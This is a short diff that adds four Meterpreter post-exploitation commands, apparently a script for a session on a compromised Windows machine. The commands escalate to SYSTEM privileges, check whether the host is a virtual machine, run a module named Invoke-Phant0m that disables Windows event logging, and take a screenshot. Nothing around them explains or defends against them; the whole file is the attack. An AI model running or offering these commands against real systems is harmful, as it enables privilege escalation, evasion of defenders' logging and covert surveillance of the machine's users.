@@ -1,0 +1,4 @@
+getsystem
+run post/windows/gather/checkvm
+run post/windows/manage/Invoke-Phant0m
+screenshot -v -p Phantom.jpeg -v true
